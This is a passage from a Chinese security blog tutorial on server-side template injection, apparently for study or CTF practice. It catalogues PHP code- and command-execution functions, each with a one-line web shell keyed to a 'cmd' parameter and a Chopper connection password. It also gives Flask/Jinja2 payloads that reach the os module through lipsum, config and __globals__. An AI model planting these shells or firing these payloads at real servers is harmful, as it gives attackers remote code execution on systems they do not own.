<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="浅析SSTI漏洞, hybcx&#39;s blog">
    <meta name="description" content="SSTI注入姿势
一、常见代码执行函数
代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>浅析SSTI漏洞 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">浅析SSTI漏洞</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
                                常见top漏洞
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-08-06
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-05-02
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    26.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    120 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>SSTI注入姿势</h1>
<h2 id="一、常见代码执行函数">一、常见代码执行函数</h2>
<p><strong>代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()</strong></p>
<h3 id="1-eval">1- eval()</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">传入的参数必须为PHP代码，即需要以分号结尾。
    命令執行：cmd=system(whoami);
    菜刀连接密码：cmd
 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="特别注意：php中-是干什么的"><strong>特别注意：php中@是干什么的</strong></h3>
<p><strong>屏蔽掉出错信息,有@时就算连接出错,也不会报错的</strong></p>
<p><strong>原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为</strong></p>
<h3 id="2-assert-（最好不要加上分号作为结尾）">2- assert()  --（最好不要加上分号作为结尾）</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">assert函数是直接将传入的参数当成PHP代码，不需要以分号结尾（特别注意），有时加上分号不会显示结果。
    命令執行：cmd=system(whoami)
    菜刀连接密码：cmd
 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-call-user-func">3- call_user_func()</h3>
<pre class="line-numbers language-none"><code class="language-none">传入的参数作为assert函数的参数
    命令执行：cmd=system(whoami)
    菜刀连接密码：cmd

&lt;?php call_user_func("assert",$_POST['cmd']); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318095943109.png" alt="image-20230318095943109"></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
call_user_func($_POST["fun"],$_POST["para"])
?&gt;
//post:fun=assert&amp;para=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100021647.png" alt="image-20230318100021647"></p>
<h3 id="4-create-function">4- create_function()</h3>
<pre class="line-numbers language-none"><code class="language-none">创建匿名函数执行代码
执行命令和上传文件参考eval函数(必须加分号)。
&lt;?php $func =create_function('',$_POST['cmd']);$func(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100307290.png" alt="image-20230318100307290"></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$a= $_POST['func'];
$b = create_function('$a',"echo $a");
$b('');
?&gt;
//post:func=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100341291.png" alt="image-20230318100341291"></p>
<h3 id="5-array-map">5- array_map()</h3>
<pre class="line-numbers language-none"><code class="language-none">array_map() 函数
将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。
回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
    命令执行http://localhost/123.php?func=system   cmd=whoami
    菜刀连接http://localhost/123.php?func=assert   密码：cmd
&lt;?php
    $func=$_GET['func'];
    $cmd=$_POST['cmd'];
    $array[0]=$cmd;
    $new_array=array_map($func,$array);
    echo $new_array;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100418007.png" alt="image-20230318100418007"></p>
<h3 id="6-call-user-func-array">6- call_user_func_array()</h3>
<pre class="line-numbers language-none"><code class="language-none">将传入的参数作为数组的第一个值传递给assert函数
    cmd=system(whoami)
    菜刀连接密码：cmd
&lt;?php
    $cmd=$_POST['cmd'];
    $array[0]=$cmd;
    call_user_func_array("assert",$array);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100436381.png" alt="image-20230318100436381"></p>
<h3 id="7-array-filter">7- array_filter()</h3>
<pre class="line-numbers language-none"><code class="language-none">用回调函数过滤数组中的元素：array_filter(数组,函数)
    命令执行func=system&amp;cmd=whoami
    菜刀连接http://localhost/123.php?func=assert  密码cmd
&lt;?php
    $cmd=$_POST['cmd'];
    $array1=array($cmd);
    $func =$_GET['func'];
    array_filter($array1,$func);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100458866.png" alt="image-20230318100458866"></p>
<h3 id="8-uasort-函数">8- uasort()函数</h3>
<pre class="line-numbers language-none"><code class="language-none">php环境&gt;=&lt;5.6才能用
uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
    命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);
    菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd
&lt;?php
    usort($_GET,'asse'.'rt');
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100517748.png" alt="image-20230318100517748"></p>
<h3 id="9-preg-replace">9- preg_replace()</h3>
<pre class="line-numbers language-none"><code class="language-none">preg_replace('正则规则','替换字符'，'目标字符')
执行命令和上传文件参考assert函数(不需要加分号)。
将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。
&lt;?php
    preg_replace("/test/e",$_POST["cmd"],"jutst test");
?&gt;
这里可以使用chr()函数转换ASCII编码来执行代码。
 
#phpinfo();
eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318100543239.png" alt="image-20230318100543239"></p>
<h2 id="二、常见命令执行函数">二、常见命令执行函数</h2>
<p>*<em>命令执行函数主要有（7个）：<em>system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``</em></em></p>
<h3 id="1-system">1- system()</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    将字符串作为OS命令执行，自带输出功能。

&lt;?php system($_POST["cmd"]);?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-passthru">2-passthru()</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。

&lt;?php passthru($_POST["cmd"]);?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="3-exec">3- exec()</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。

&lt;?php echo exec($_POST["cmd"]);?&gt; 

&lt;?php print exec($_POST["cmd"]);?&gt;    //他的输出结果需要打印，system()不用打印<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="4-pcntl-exec">4- pcntl_exec()</h3>
<pre class="line-numbers language-none"><code class="language-none">linux: &lt;?php pcntl_exec("/bin/bash",array($_POST["cmd"])); ?&gt;

用的不多。暂时略过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="5-shell-exec">5- shell_exec()</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。

&lt;?php echo shell_exec($_POST["cmd"]); ?&gt;

&lt;?php print shell_exec($_POST["cmd"]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="6-popen-proc-open">6- popen()/proc_open()</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。

linux: &lt;?php $handle = popen("/bin/ls","r");?&gt;

windows:
&lt;?php
	$cmd = $_POST['cmd']."&gt;&gt; 1.txt";
	//此时的$cmd=ipconfig &gt;&gt; 1.txt
	popen("$cmd",'r'); //实际上就是 popen("ipconfig &gt;&gt; 1.txt", "r"),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。
 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="7-反引号">7- 反引号 ``</h3>
<pre class="line-numbers language-none"><code class="language-none">    作用
    [``]反引号里面的代码也会被当作OS命令来执行

&lt;?php echo `whoami`?&gt;

或者：

&lt;?php $cmd = $_GET['cmd'];print `$cmd`; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>详解查看</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%9A%84&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen是干什么的&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187</a></p>
<h2 id="三、注入流程以及必要函数的用法">三、注入流程以及必要函数的用法</h2>
<pre class="line-numbers language-none"><code class="language-none">变量块 {{}}	用于将表达式打印到模板输出
注释块 {##}	注释
控制块	{%%}	可以声明变量，也可以执行语句
行声明	##		可以有和{%%}相同的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。

__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.

__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里

__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')

__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。

__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。

url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}

current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)

config               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read() }}

g                    {{g}}得到&lt;flask.g of 'flask_ssti'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">int()		将值转换为int类型；

float()		将值转换为float类型；

lower()		将字符串转换为小写；

upper()		将字符串转换为大写；

title()		把值中的每个单词的首字母都转成大写；

capitalize()	把变量值的首字母转成大写，其余字母转小写；

trim()		截取字符串前面和后面的空白字符；

wordcount()	计算一个长字符串中单词的个数；

reverse()	字符串反转；

replace(value,old,new)	替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)	截取length长度的字符串；

striptags()	删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e	转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()		禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；

list()		将变量列成列表；

string()	将变量转换成字符串；

join()		将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()		返回一个数值的绝对值；

first()		返回一个序列的第一个元素；

last()		返回一个序列的最后一个元素；

format(value,arags,*kwargs)	格式化字符串。比如：{{"%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()	返回一个序列或者字典的长度；

sum()		返回列表内数值的和；

sort()		返回排序后的列表；

default(value,default_value,boolean=false)	如果当前变量没有值，则会使用参数中的值来代替。示例：

name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()	返回字符串的长度，别名是count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-1-初识SSTI">2.1. 初识SSTI</h3>
<h4 id="1-什么是SSTI？">1. 什么是SSTI？</h4>
<p>SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。</p>
<p>可能SSTI对大家而言不是很熟悉，但是相信大家很熟悉SQL注入。实际上这两者的思路都是相同的，因此可以类比来分析。</p>
<h4 id="2-render-template渲染函数是什么">2. render_template渲染函数是什么</h4>
<p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h4 id="3-注入的思想">3. 注入的思想</h4>
<p>用函数不断调用我们要使用的命令：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
<h4 id="4-什么是模板引擎">4. 什么是模板引擎</h4>
<p>是为了使 <strong>用户界面</strong>和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中</strong>，然后反馈给浏览器，呈现在用户面前</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622150450513.png" alt="image-20230622150450513"></p>
<p>当前的主流框架，一般都采用MVC模式，即：<strong>Model-View-Controller</strong>，用户的输入先进入Controller控制器，然后根据清流类型和请求的指令发送给对应的Model业务模型，由Model层进行业务逻辑的判断、数据库的存取等，最后把结果返回给View视图层，再经模板引擎的渲染展示给用户</p>
<p>模板引擎的基本机理就是<strong>替换（转换）</strong>：<strong>将指定的标签转换为需要的业务数据；将指定的伪语句按照某种流程来变换输出</strong></p>
<p>引用一段代码来简单说一下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 模板
var template <span class="token operator">=</span> <span class="token string">'&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;'</span><span class="token punctuation">;</span>

<span class="token operator">//</span> 用于匹配的正则
<span class="token operator">/</span><span class="token operator">*</span>
    用于过滤出以<span class="token operator">&lt;</span><span class="token operator">%</span>开头，<span class="token operator">%</span><span class="token operator">&gt;</span>结尾，并且中间不包含<span class="token operator">%</span>或<span class="token operator">&gt;</span>的匹配项
    其目的在于过滤出template中的 <span class="token operator">&lt;</span><span class="token operator">%</span>name<span class="token operator">%</span><span class="token operator">&gt;</span> 和 <span class="token operator">&lt;</span><span class="token operator">%</span>age<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">*</span><span class="token operator">/</span>
var regex <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">^</span><span class="token operator">%</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>?<span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">/</span>g<span class="token punctuation">;</span>

<span class="token operator">//</span> 数据
var data <span class="token operator">=</span>
<span class="token punctuation">{</span>
    name<span class="token punctuation">:</span><span class="token string">'Deutsh'</span><span class="token punctuation">,</span>
    age<span class="token punctuation">:</span><span class="token number">22</span>
<span class="token punctuation">}</span>

<span class="token operator">//</span> 模板引擎
var TemplateEngine <span class="token operator">=</span> function <span class="token punctuation">(</span>template<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
